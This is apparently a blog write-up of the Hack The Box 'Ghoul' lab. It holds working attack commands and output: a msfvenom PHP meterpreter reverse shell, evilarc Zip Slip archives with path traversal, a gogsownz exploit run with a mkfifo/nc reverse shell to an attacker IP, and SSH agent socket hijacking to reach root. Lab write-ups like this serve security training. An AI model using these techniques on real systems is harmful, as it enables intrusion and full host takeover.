---
layout: single
title: Ghoul - Hack The Box
excerpt: "Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS."
date: 2019-10-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-ghoul/ghoul_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - zipslip
  - git
  - ssh
  - unintended
  - gogs
  - containers
---

![](/assets/images/htb-writeup-ghoul/ghoul_logo.png)

Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.

## Summary

- Guess the simple HTTP basic auth credentials for the tomcat web application running on port 8080
- Exploit the Zip Slip vulnerability in the upload form to upload a meterpreter shell
- Find SSH keys backups for 3 local users, one of them is encrypted but the password is found in the chat app screenshot
- Find additional container hosts by uploading a statically compiled nmap binary
- Identify cronjob of user logging onto one of the container and using the SSH agent
- Find Gogs application running on another container and pop a shell using CVE-2018-18925 and CVE-2018-20303
- Download 7zip archive containing a git repo and extract credentials from git reflogs
- Log in as root to the container on which we found the SSH agent earlier and hijack the private keys of the connecting user to get root access on the host

### Tools/Blogs used

- [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
- [https://github.com/TheZ3ro/gogsownz](https://github.com/TheZ3ro/gogsownz)

### Portscan

A few observations based on the initial scan:
- There are two sshd daemons running on this box and they're both running a different version.
- There are two webservers, one running Apache and the other one Tomcat

```
# nmap -sC -sV -p- 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 15:00 EDT
Nmap scan report for ghoul.htb (10.10.10.101)
Host is up (0.011s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website enumeration on port 80

The website is some kind of Tokyo Ghoul themed website with a homepage, blog and contact section.

![](/assets/images/htb-writeup-ghoul/port80.png)

There's a contact form so that could be a potential target for command injection or XSS:

![](/assets/images/htb-writeup-ghoul/contact.png)

The contact form doesn't work because it sends a `POST /bat/MailHandler.php` and that file doesn't exist. This is probably safe to ignore for now.

Like every box running a webserver, I'm running gobuster to see if I can find any hidden directories or files.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.101
[...]
/archives (Status: 301)
/css (Status: 301)
/images (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/server-status (Status: 403)
/uploads (Status: 301)
/users (Status: 301)
```

`secret.php`, `/users` and `/uploads` are interesting, but the later gives me a 403 Forbidden message.

The `secret.pnp` is just an image of some kind of simulated chat application.

![](/assets/images/htb-writeup-ghoul/secret.png)

I've highlighted above some possibles clues:

- That fake flag/hash is obviously a troll
- There's a mention of an RCE, file service, and vsftp. I didn't see FTP open during my portscan however.
- IP logs, maybe useful for something else
- X server, but I didn't see that port open during the portscan
- ILoveTouka could be a password or part of a password, I'll keep that in mind for later

The `/users` page shows a login page:

![](/assets/images/htb-writeup-ghoul/users.png)

I tried a couple of default logins and looked for SQL injections, no luck. I will need to find the credentials to get past the login page.

### Website enumeration on port 8080

The website is protected with HTTP Basic Auth, but I guessed the `admin/admin` login right on the first try.

Once authenticated, I find another website running on port 8080. It's some generic company website.

![](/assets/images/htb-writeup-ghoul/port8080.png)

There's also a contact form but it doesn't seem to do anything except return some random message:

![](/assets/images/htb-writeup-ghoul/contact2.png)

![](/assets/images/htb-writeup-ghoul/troll_1.png)

The most interesting thing on this page are the two upload forms: One for images, and another one for Zip files.

![](/assets/images/htb-writeup-ghoul/upload_img.png)

![](/assets/images/htb-writeup-ghoul/upload_zip.png)

The image upload form checks that the file signature is a JPEG.

![](/assets/images/htb-writeup-ghoul/upload_jpg_ok.png)

If I try to upload any other file type I get the following error message.

![](/assets/images/htb-writeup-ghoul/upload_jpg_nok.png)

The same checks are enforced for ZIP files, here's a successful upload for a ZIP file:

![](/assets/images/htb-writeup-ghoul/upload_jpg_ok.png)

And here's the error when uploading another file type:

![](/assets/images/htb-writeup-ghoul/upload_jpg_nok.png)

So it seems I can only upload ZIP and JPG files and I don't know where they are stored. I ran gobuster to try to find an upload folder or something on port 8080 but I didn't find anything.

### Getting a shell with Zip Slip

There's a well known arbitrary file overwrite vulnerability called Zip Slip that affects multiple projects, including Java. The gist of it is we can craft a malicious zip file  that when extracted will place the content to an arbitrary location of our choosing. Normally, using file traversal characters would be forbidden but the vulnerability here allow such characters to be processed by Java. In this case, we want to place a reverse shell payload somewhere on the webserver where we can access it and trigger it.

Details on the vulnerability can be found here: [https://github.com/snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

To generate the zip files, I used the [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) python tool:

```
# msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1112 bytes
Saved as: met.php
```

```
# python evilarc.py -f met.zip -o unix -p "../../../../../../var/www/html" met.php
Creating met.zip containing ../../../../../../../../../../../../../../var/www/html/met.php
```

After creating the archive, I uploaded it then triggered the meterpreter payload by browsing to it `/met.php`

```
[*] Started reverse TCP handler on 10.10.14.23:4444
msf5 exploit(multi/handler) > [*] Encoded stage with php/base64
[*] Sending encoded stage (51106 bytes) to 10.10.10.101
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.101:46874) at 2019-05-06 21:41:05 -0400

meterpreter > shell
Process 1180 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Aogiri:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Cool, I now have a shell but I can't read any of the home directories:

```
www-data@Aogiri:/var/backups/backups/keys$ ls -l /home
ls -l /home
total 24
drwx------ 1 Eto    Eto    4096 Dec 13 13:45 Eto
drwx------ 1 kaneki kaneki 4096 Dec 13 13:45 kaneki
drwx------ 1 noro   noro   4096 Dec 13 13:45 noro
```

Next, I checked the `/var/www/html` directory for any useful data or credential in the website source files:

`login.php` has hardcoded credentials:

```php
if(isset($_POST['Submit'])){
/* Define username and associated password array */
$logins = array('kaneki' => '123456','noro' => 'password123','admin' => 'abcdef');
```

`/usr/share/tomcat7/conf/tomcat-users.xml` has some more credentials:

```
<!--<user username="admin" password="test@aogiri123" roles="admin" />
  <role rolename="admin" />-->
```

### Find SSH user keys

After some enumeration I found interesting stuff in `/var/backups/backups`:

```
www-data@Aogiri:/var/backups/backups$ ls -la
ls -la
total 3852
drwxr-xr-x 1 root root    4096 Dec 13 13:45 .
drwxr-xr-x 1 root root    4096 Dec 13 13:45 ..
-rw-r--r-- 1 root root 3886432 Dec 13 13:45 Important.pdf
drwxr-xr-x 2 root root    4096 Dec 13 13:45 keys
-rw-r--r-- 1 root root     112 Dec 13 13:45 note.txt
-rw-r--r-- 1 root root   29380 Dec 13 13:45 sales.xlsx
```

The note is pretty useless:

```
www-data@Aogiri:/var/backups/backups$ cat note.txt
The files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.
```

But there are SSH keys backups for all three users:

```
www-data@Aogiri:/var/backups/backups/keys$ ls -l
total 12
-rwxr--r-- 1 root root 1675 Dec 13 13:45 eto.backup
-rwxr--r-- 1 root root 1766 Dec 13 13:45 kaneki.backup
-rwxr--r-- 1 root root 1675 Dec 13 13:45 noro.backup

www-data@Aogiri:/var/backups/backups/keys$ file *.backup
file *.backup
eto.backup:    PEM RSA private key
kaneki.backup: PEM RSA private key
noro.backup:   PEM RSA private key
```

`eto.backup` and `noro.backup` are unencrypted, but `kaneki.backup` is encrypted:

```
www-data@Aogiri:/var/backups/backups/keys$ cat kaneki.backup
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F
```

I transfered all the files to my Kali VM, including the `Important.pdf` file but I couldn't open it (corrupted or something).

###  Logging as Eto

Nothing interesting with Eto:

```
# ssh -i eto.backup Eto@10.10.10.101
Eto@Aogiri:~$ ls
alert.txt
Eto@Aogiri:~$ cat alert.txt
Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
```

###  Logging as noro

Nothing interesting either with noro:

```
# ssh -i noro.backup noro@10.10.10.101
noro@Aogiri:~$ ls
to-do.txt
noro@Aogiri:~$ cat to-do.txt
Need to update backups.
```

###  Logging as kaneki

I found the password for the kaneki's SSH private key is `ILoveTouka` as per the `secret.php` page found earlier:

```
# ssh -i kaneki.backup kaneki@10.10.10.101
Enter passphrase for key 'kaneki.backup':
Last login: Sun Jan 20 12:33:33 2019 from 172.20.0.1
kaneki@Aogiri:~$ ls
note.txt  notes  secret.jpg  user.txt

kaneki@Aogiri:~$ cat note.txt
Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.

kaneki@Aogiri:~$ cat notes
I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
DM me for the access.

kaneki@Aogiri:~$ cat user.txt
7c0f11...
```

The `secret.jpg` file seems to be just a troll, I tried `steghide`, `binwalk` and other CTF stego tools and didn't find any hidden information.

I'm in a docker container, as per the `.dockerenv` file and the IP address `172.20.0.10`:

```
kaneki@Aogiri:/$ ls -la
total 116
-rwxr-xr-x   1 root root    0 Dec 13 13:45 .dockerenv

kaneki@Aogiri:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 54446  bytes 6369464 (6.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44912  bytes 56773469 (56.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Getting access to kaneki-pc

Kaneki's ssh directory contains two entries in the `authorized_keys`:

```
kaneki@Aogiri:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7T[...] kaneki_pub@kaneki-pc
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8f[...] kaneki@Aogiri
```

I noticed that there is a different username: `kaneki_pub`

There's most likely another container running, I found it by uploading a statically compiled copy of nmap and scanning 172.20.0.0/16:

```
kaneki@Aogiri:~$ ./nmap -sP 172.20.0.0/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 02:35 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00039s latency).
Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.00027s latency).
Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00029s latency).
```

So the other container is `172.20.0.150`. I can log in using the `kaneki_pub` username and the same `ILoveTouka` password for the private key.

```
kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
Enter passphrase for key '/home/kaneki/.ssh/id_rsa':
Last login: Tue May  7 00:04:35 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$ ls
to-do.txt
kaneki_pub@kaneki-pc:~$ cat to-do.txt
Give AogiriTest user access to Eto for git.
```

`AogiriTest` could be useful, let's make note of it.

### Enumerating kaneki-pc

The kaneki-pc container has a leg on another network segment: `172.18.0.0/16`

```
kaneki_pub@kaneki-pc:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
```

There's also another user `kaneki_adm` on this machine, but I don't have access to it:

```
kaneki_adm:x:1001:1001::/home/kaneki_adm:/bin/bash
kaneki_pub:x:1000:1002::/home/kaneki_pub:/bin/bash
kaneki_pub@kaneki-pc:/home$ ls
kaneki_adm  kaneki_pub
```

I saw that some user connected to the server with ssh-agent enabled:

```
kaneki_pub@kaneki-pc:/home$ ls -l /tmp
total 16
drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzU
drwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 May  7 02:28 sshd-stderr---supervisor-22D6A5.log
-rw------- 1 root       root          0 May  7 02:28 sshd-stdout---supervisor-0BpnC3.log
```

There seems to be a cron job from `172.20.0.1` that logs in with user `kaneki_adm` every 6 minutes.

```
kaneki_pub@kaneki-pc:/home$ last -10
kaneki_a pts/2        172.20.0.1       Tue May  7 02:42 - 02:42  (00:00)
kaneki_p pts/1        172.20.0.10      Tue May  7 02:38    gone - no logout
kaneki_a pts/1        172.20.0.1       Tue May  7 02:36 - 02:36  (00:00)
kaneki_a pts/1        172.20.0.1       Tue May  7 02:30 - 02:30  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Apr 28 14:12 - 14:12  (00:00)
kaneki_a pts/1        172.20.0.1       Wed Apr 24 12:42 - 12:42  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:18 - 06:18  (00:00)
kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:12 - 06:15  (00:02)
kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:12 - 17:12  (00:00)
kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:06 - 17:06  (00:00)

wtmp begins Sat Dec 29 05:26:31 2018
kaneki_pub@kaneki-pc:/home$ date
Tue May  7 02:44:01 UTC 2019
```

I uploaded Ippsec's process monitor to watch for any cronjob or new processes created:

```sh
#!/bin/bash

IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process")
	sleep 1
	old_process=$new_process
done
```

After a few minutes I caught the `kaneki_adm` user connecting to `172.18.0.1` as root:

```
kaneki_pub@kaneki-pc:~$ ./procmon.sh
7,9d6
< sshd: kaneki_adm [priv]
< sshd: kaneki_adm@pts/2
< ssh root@172.18.0.1 -p 2222 -t ./log.sh
```

If I had root access on the container I could get access to the ssh agent socket and hijack the private key but I don't have root yet.

Next I scanned the subnet on that other network interface to see if I could find any other hosts there:

```
kaneki_pub@kaneki-pc:~$ ./nmap -sP 172.18.0.0/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:08 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.18.0.1)
Host is up (0.00082s latency).
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00068s latency).
Nmap scan report for kaneki-pc (172.18.0.200)
Host is up (0.00037s latency).

[...]

kaneki_pub@kaneki-pc:~$ ./nmap -p- 172.18.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:09 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown
```

I found `172.18.0.2` running both SSH and some other service on port 3000. At this point it's probably a good idea to start setting up some port forwarding. With the following I can access port 3000 through a double hop:

```
ssh -L 2222:172.20.0.150:22 -i root.key root@10.10.10.101
ssh -i kaneki.backup -p 2222 -L 3000:172.18.0.2:3000 kaneki_pub@127.0.0.1
```

### Exploiting Gogs on the 3rd container

On port 3000 we find a Gogs application running:

![](/assets/images/htb-writeup-ghoul/port3000.png)

The version is shown at the bottom of the page:

![](/assets/images/htb-writeup-ghoul/gogs_version.png)

I tried various credentials and was able to get with pieces of info I found earlier: `AogiriTest / test@aogiri123`

![](/assets/images/htb-writeup-ghoul/gogs_logged.png)

There's nothing on the Gogs application, no repo, nothing interesting.

Next I did some research and found there's two CVE's for this version: CVE-2018-18925 and CVE-2018-20303. Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a ".." session-file forgery in the file session provider in file. The other CVE is a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.

There's already a nice exploit available on Github: [https://github.com/TheZ3ro/gogsownz](https://github.com/TheZ3ro/gogsownz)

```
# python3 gogsownz.py http://127.0.0.1:3000/ --burp -C "AogiriTest:test@aogiri123" -v --preauth --rce "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f" --cleanup
[!] Created Gogsownz
[i] Starting Gogsownz on: http://127.0.0.1:3000
[+] Loading Gogs homepage
[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916
[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
[!] Creds found.
[!] Logging in...
[+] Performing login
[+] Logged in sucessfully as AogiriTest
[i] Exploiting pre-auth PrivEsc...
[+] Uploading admin session as attachment file
[+] Uploaded successfully, preparing cookies for the Path Traversal
[+] Admin session hijacked, trying to login as admin
[i] Signed in as kaneki, is admin True
[i] Current session cookie: '../attachments/9/4/94918be1-7932-44b5-8490-40ff628acf8c'
[+] Got UserID 1
[+] Repository created sucessfully
[+] Setting Git hooks
[+] Git hooks set sucessfully
[+] Fetching last commit...
[+] Got last commit
[+] Triggering the RCE with a new commit
```

I popped a shell as user `git`:

```
# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.101.
Ncat: Connection from 10.10.10.101:42515.
/bin/sh: can't access tty; job control turned off
/data/git/gogs-repositories/kaneki/gogstest.git $ id
uid=1000(git) gid=1000(git) groups=1000(git)
```

I saved the kaneki public key to the `git` user folder in case I lose my shell:

```
/data/git/.ssh $ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc" >> authorized_keys
```

There's not much `git` has access to, but I found an interesting  `gosu` suid binary:

```
/data/git $ find / -perm /4000 2>/dev/null
[...]
/usr/sbin/gosu
/bin/su
```

I can get root access by just running it:

```
3713ea5e4353:~$ gosu root /bin/bash
3713ea5e4353:/data/git# cd
3713ea5e4353:~#
```

The root user directory contains a 7zip archive and a `session.sh` file with some credentials.

```
3713ea5e4353:~# ls
aogiri-app.7z  session.sh
```

```shell
3713ea5e4353:~# cat session.sh
#!/bin/bash
while true
do
  sleep 300
  rm -rf /data/gogs/data/sessions
  sleep 2
  curl -d 'user_name=kaneki&password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/login
done
```

The `session.sh` logs in to the gogs application every 10 minuters as per the crontab.

```
3713ea5e4353:~# crontab -l
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly
*/10	*	*	*	*	/root/session.sh
```

I grabbed the 7zip file and extracted it locally on my Kali VM. It contains the skeleton for a Java application and the git metadata.

```
# ls -la
total 60
drwxr-xr-x 5 root root  4096 May  6 12:28 .
drwxr-xr-x 3 root root 12288 May  6 12:19 ..
drwxr-xr-x 8 root root  4096 May  6 12:28 .git
-rw-r--r-- 1 root root   268 May  6 12:28 .gitignore
drwxr-xr-x 3 root root  4096 Dec 29 01:36 .mvn
-rwxr-xr-x 1 root root  9113 May  6 12:28 mvnw
-rw-r--r-- 1 root root  5810 May  6 12:28 mvnw.cmd
-rw-r--r-- 1 root root  1931 May  6 12:28 pom.xml
-rw-r--r-- 1 root root   124 May  6 12:28 README.md
drwxr-xr-x 4 root root  4096 Dec 29 01:36 src
```

First thing I did was check the git commit log for any interesting data:

```
# git log
commit e29ad435b1cf4d9e777223a133a5b0a9aaa20625 (HEAD -> master)
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:38:18 2018 +0530

    added service

commit b3752e00721b4b87c99ef58e3a54143061b20b99
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:34:07 2018 +0530

    noro stop doing stupid shit

commit 813e0a518064778343ba54b64e16ad44c19900fb
Author: noro <noro@aogiri.htb>
Date:   Sat Dec 29 11:31:26 2018 +0530

    hello world!

commit ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:24:41 2018 +0530

    mysql support

commit 51d2c360b13b37ad608361642bd86be2a4983789
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:22:02 2018 +0530

    added readme

commit bec96aaf334dc0110caa163e308d4e2fc2b8f133
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:20:22 2018 +0530

    updated dependencies

commit 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667
Author: kaneki <kaneki@aogiri.htb>
Date:   Sat Dec 29 11:15:14 2018 +0530

    update readme
```

Commit `b3752e00721b4b87c99ef58e3a54143061b20b99` seems interesting since kaneki is cleaning up Noro's mess:

```
# git show b3752e00721b4b87c99ef58e3a54143061b20b99
commit b3752e00721b4b87c99ef58e3a54143061b20b99
[...]
 spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
-spring.datasource.username=root
-spring.datasource.password=root
+spring.datasource.username=kaneki
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0
```

Ahah! Found some root password here. Of course, nothing's listening on port 3306 on any of the container but maybe I can use the root password on the `kaneki-pc` container:

```
kaneki_pub@kaneki-pc:~$ su
Password:
su: Authentication failure
```

Nope... Let's keep looking.

Checking the git reflogs, I see the following:

```
# git reflog
647c5f1 (HEAD -> master, origin/master) HEAD@{0}: commit: changed service
b43757d HEAD@{1}: commit: added mysql deps
b3752e0 HEAD@{2}: reset: moving to b3752e0
0d426b5 HEAD@{3}: reset: moving to 0d426b5
e29ad43 HEAD@{4}: reset: moving to HEAD^
0d426b5 HEAD@{5}: reset: moving to HEAD
0d426b5 HEAD@{6}: reset: moving to origin/master
0d426b5 HEAD@{7}: commit: update dependencies
e29ad43 HEAD@{8}: commit: added service
b3752e0 HEAD@{9}: commit: noro stop doing stupid shit
813e0a5 HEAD@{10}: commit: hello world!
ed5a88c HEAD@{11}: commit: mysql support
51d2c36 HEAD@{12}: commit: added readme
bec96aa HEAD@{13}: commit: updated dependencies
8b74520 HEAD@{14}: commit (initial): update readme
```

I diff'ed every commit and different password for the database: `7^Grc%C\7xEQ?tb4`

```
# git diff HEAD@{4}
[...]
-spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
 spring.datasource.username=kaneki
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0
```

### Root access through SSH agent hijack

The new found password works to get root access on the `kaneki-pc` container:

```
kaneki_pub@kaneki-pc:~$ su -l root
Password:
root@kaneki-pc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kaneki-pc:~# ls
root.txt
root@kaneki-pc:~# cat root.txt
You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
```

As expected, I don't have access to the real `root.txt` flag on this one.

Earlier I found that a user connects remotely then back using root's account on the host. I can just wait until the next time it connects then hijack its ssh agent socket:

```
root@kaneki-pc:/tmp# ls -l
total 20
drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzU
drwx------ 2 kaneki_adm kaneki_adm 4096 May  8 02:00 ssh-Y2CJdynAyJ
drwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 May  8 01:16 sshd-stderr---supervisor-b_s4zO.log
-rw------- 1 root       root          0 May  8 01:16 sshd-stdout---supervisor-rrVo6W.log

root@kaneki-pc:/tmp# cd ssh-Y2CJdynAyJ
root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ls -l
total 0
srwxr-xr-x 1 kaneki_adm kaneki_adm 0 May  8 02:00 agent.216
root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# export SSH_AUTH_SOCK=agent.216

root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ssh -p 2222 172.18.0.1
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)

[...]

Last login: Tue May  7 19:00:02 2019 from 172.18.0.200
root@Aogiri:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Aogiri:~# ls
log.sh  root.txt
root@Aogiri:~# cat root.txt
7c0f11...
```

### Unintended way to root on Aogiri container

Instead of using the SSH keys found in the backups directory I can use the Zip Slip vulnerability to upload my own SSH publicy key to the root directory's SSH folder.

```
# cp /root/.ssh/id_rsa.pub authorized_keys
# python evilarc.py -f root.zip -o unix -p "../../../../../../root/.ssh" authorized_keys
Creating root.zip containing ../../../../../../../../../../../../../../root/.ssh/authorized_keys
# curl -u admin:admin -F 'data=@root.zip' http://10.10.10.101:8080/upload
```

I can now log in as root:

```
# ssh 10.10.10.101
Last login: Tue May  7 00:06:28 2019 from 172.20.0.1
root@Aogiri:~# id
uid=0(root) gid=0(root) groups=0(root)
```